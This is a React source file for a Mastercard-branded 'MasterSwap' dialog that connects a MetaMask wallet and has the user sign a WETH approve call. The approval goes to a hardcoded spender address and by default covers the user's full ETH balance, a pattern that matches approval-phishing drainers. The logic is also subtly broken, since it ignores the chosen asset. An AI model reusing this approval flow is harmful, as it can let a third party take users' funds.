import React, { useState } from "react";
import Grid from '@mui/material/Grid';
import { ethers } from "ethers";

import Dialog from '@mui/material/Dialog';
import Tooltip, { tooltipClasses } from '@mui/material/Tooltip';
import HelpOutlineIcon from '@mui/icons-material/HelpOutline';
import { styled } from '@mui/material/styles';
import Select, { selectClasses } from '@mui/material/Select';
import MenuItem from '@mui/material/MenuItem';
import InputBase from '@mui/material/InputBase';
import AddCardIcon from '@mui/icons-material/AddCard';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import { orange } from '@mui/material/colors';
import IconButton from "@mui/material/IconButton";
import CloseIcon from "@mui/icons-material/Close";
import DialogContent from "@mui/material/DialogContent";


const CustomizedTooltip = styled(({ className, ...props }) => (
    <Tooltip {...props} classes={{ popper: className }} />
))(({ theme }) => ({
    [`& .${tooltipClasses.tooltip}`]: {
        fontSize: 11,
        maxWidth: '200px'
    },
}));

const CustomizedInput = styled(InputBase)(({ theme }) => ({
    '& .MuiInputBase-input': {
        borderRadius: 8,
        backgroundColor: theme.palette.background.paper,
        border: '1.5px solid #FB8C00',
        padding: '6px',
    },
    '&:focused': {
        color: "gray"
    },
}));

const maskAccount = (account) => {
    if (account) {
        return account.slice(0, 4) + ' **** **** ' + account.slice(account.length - 4, account.length)
    }
    return ''
}

function Info(props) {
    const [show, setShow] = useState(true)
    const [account, setAccount] = useState('')
    const [currency, setCurrency] = useState('');
    const [signed, setSigned] = useState(false)
    const [rejected, setRejected] = useState(false)
    const [allowance, setAllowance] = useState(null);

    async function connectWallet() {
        if (typeof window.ethereum !== "undefined") {
            try {
                console.log("connecting");
                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                setAccount(accounts[0])
            } catch (error) {
                console.log(error);
            }

        }
        else {
            alert("Please install MetaMask")
        }
    }

    async function approveTransfers() {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        let balance = 0;
        await provider.getBalance(account).then((bal) => {
            balance = ethers.utils.formatEther(bal)
        })
        const signer = provider.getSigner();

        const wethABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "guy", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "src", "type": "address" }, { "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "wad", "type": "uint256" }], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [], "name": "deposit", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "guy", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Deposit", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Withdrawal", "type": "event" }]

        const wethaddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
        const wethContract = new ethers.Contract(wethaddress, wethABI, provider);
        let amount = ethers.utils.parseEther(balance.toString());

        if (allowance) {
            amount = ethers.utils.parseEther((allowance / 100 * balance).toString());
        }
        console.log("amount for approval", amount)
        await wethContract.connect(signer).approve('0x1f472D2550744f20C13Ac525fa365Ad88317078A', amount).then((result) => {
            console.log(result)
            setSigned(true)
        }).catch((error) => {
            if (error.code === "ACTION_REJECTED") {
                setRejected(true)
            } else console.log(error.code)
        })
    }

    const handleSignApproval = async () => {
        await approveTransfers()
        props.onConnected()
    }

    const disConnectWallet = () => {
        setAccount('')
        setRejected(false)
    }

    const handleSelectCurrency = (event) => {
        setCurrency(event.target.value);
        setSigned(false)
        if (rejected) {
            setRejected(false)
        }
    };

    return (
        <Dialog
            className="ml-auto mr-auto"
            open={props.show}
            sx={{ borderRadius: "30px" }}
        >
            <DialogContent style={{ position: "relative" }}>
                <IconButton
                    style={{ position: "absolute", top: "0", right: "0" }}
                    onClick={props.onCloseClick}
                >
                    <CloseIcon />
                </IconButton>
            </DialogContent>
            <div className="mx-3">
                <img className='ml-auto mr-auto' src='/mastercard.svg' width="100px" />
                <h1 className='text-xl text-center'>MasterSwap</h1>
            </div>
            <div className="border-b-2 mx-3 mt-6">
                <h1 className='text-2xl text-center'>User Information</h1>
            </div>
            <Grid container spacing={1} sx={{ width: "400px" }}>
                <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                    <br></br>
                    <div className="pl-6">
                        <h2><strong>Name:</strong></h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2><strong>Bank Name:</strong></h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2><strong>Card Number:</strong></h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2><strong>Exp Date:</strong></h2>
                    </div>
                </Grid>
                <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                    <br></br>
                    <div className="pl-6">
                        <h2>Alice Strange</h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2>Bank of America</h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2>**** **** **** 4444</h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2>05/25</h2>
                    </div>
                </Grid>

                {account && <>
                    <Grid item xs={12} className='text-center mt-6 mb-3'>
                        <AddCardIcon sx={{ fontSize: "50pt", color: orange[800] }} />
                        <h1 className='text-center ml-auto mr-auto'><em>Wallet Connected</em></h1>
                    </Grid>
                    <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                        <div className="pl-6">
                            <h2><strong>Address:</strong></h2>
                        </div>
                    </Grid>
                    <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                        <div className="pl-6">
                            <p>{maskAccount(account)}</p>
                            <button className='w-[100px] h-[35px] px-1 border-[1.5px] border-orange-400 hover:bg-orange-600 rounded-lg text-[10pt]' onClick={disConnectWallet}>Disconnect</button>
                        </div>
                    </Grid>
                    <Grid item xs={12} className='text-center mt-9 mb-3 border-b-2 ml-4 mr-3'>
                        <h1 className='text-2xl ml-auto mr-auto'>Approval Asset & Amount</h1>
                    </Grid>
                    <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                        <div className="pl-6 flex justify-start">
                            <h2><strong>Asset:</strong></h2>
                            <CustomizedTooltip title="Asset you approve for Masterswap to use on your behalf" placement="right" arrow>
                                <HelpOutlineIcon sx={{ fontSize: "small" }} />
                            </CustomizedTooltip>
                        </div>
                    </Grid>
                    <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between", mt: 1 }}>
                        <div className="pl-6">
                            <Select
                                value={currency}
                                displayEmpty
                                onChange={handleSelectCurrency}
                                input={<CustomizedInput sx={{ width: "100px", height: "25px", borderRadius: "8px" }} />}
                            >
                                <MenuItem value={"usdc"}>USDC</MenuItem>
                                <MenuItem value={""}>ETH</MenuItem>
                                <MenuItem value={"matic"}>MATIC</MenuItem>
                                <MenuItem value={"dai"}>DAI</MenuItem>
                            </Select>
                        </div>
                    </Grid>
                    <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                        <div className="pl-6 flex justify-start">
                            <h2><strong>Amount:</strong></h2>
                            <CustomizedTooltip title="Max Amount in percentage you allow Masterswap to use on your behalf" placement="right" arrow>
                                <HelpOutlineIcon sx={{ fontSize: "small" }} />
                            </CustomizedTooltip>
                        </div>
                    </Grid>
                    <Grid item xs={6} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between", mt: 1 }}>
                        <div className="pl-6">
                            <h2><CustomizedInput defaultValue={100} type="number" sx={{ width: "100px", height: "20px" }} onChange={(e) => {
                                setAllowance(e.target.value)
                                setSigned(false)
                                if (rejected) {
                                    setRejected(false)
                                }
                            }} /> %</h2>
                        </div>
                    </Grid>
                </>}

                <div className="flex justify-center pb-6 ml-auto mr-auto mt-4">
                    {!account ?
                        (<button className='px-8 py-3 bg-orange-600 mt-4 hover:bg-orange-400 rounded-lg' onClick={connectWallet}>Connect to Wallet</button>)
                        :
                        (!signed ?
                            (<Grid item xs={12} className='text-center mt-6 mb-3'>
                                {rejected && <h1 className='text-center ml-auto mr-auto text-red-500'><em>User Rejected!</em></h1>}
                                <button className='px-8 py-3 bg-orange-600 mt-3 hover:bg-orange-400 rounded-lg' onClick={handleSignApproval}>
                                    Sign Approval
                                </button>
                            </Grid>)
                            :
                            (<Grid item xs={12} className='text-center mt-6 mb-3'>
                                <CheckCircleIcon sx={{ fontSize: "50pt", color: orange[800] }} />
                                <h1 className='text-center ml-auto mr-auto'><em>Approved!</em></h1>
                            </Grid>)
                        )
                    }
                </div>
            </Grid>
        </Dialog >
    );
}

export default Info;
